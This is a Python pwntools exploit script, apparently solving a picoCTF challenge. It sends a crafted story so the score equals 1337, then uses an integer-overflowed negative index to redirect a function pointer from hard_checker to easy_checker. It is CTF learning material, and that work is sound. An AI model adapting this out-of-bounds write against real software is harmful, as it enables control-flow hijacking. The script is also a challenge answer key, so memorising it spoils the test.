#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript = "b *0x080495ed")
    else:
        r = remote("saturn.picoctf.net", 50692)

    return r


def main():
    r = conn()

    # construct a story that'll give us a score that can match the easy checker requirement
    story = b'A' * (1337//ord('A')) + chr(1337 % ord('A')).encode()

    distance = (exe.sym.fun - exe.sym.check)  # find the distance between fun and check
    # the index is a number bigger than 10 so we have to integer overflow this one
    num1 = (-0x1_0000_0000 - distance) // 4 # divide by four because its ints
    
    num2 = exe.sym.easy_checker - exe.sym.hard_checker

    info(f"{num1 = }; {num2 = }")

    r.sendlineafter(b"Tell me a story and then I'll tell you if you're a 1337 >> ", story)
    r.sendlineafter(b"On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n", f"{num1} {num2}".encode())

    r.interactive()


if __name__ == "__main__":
    main()
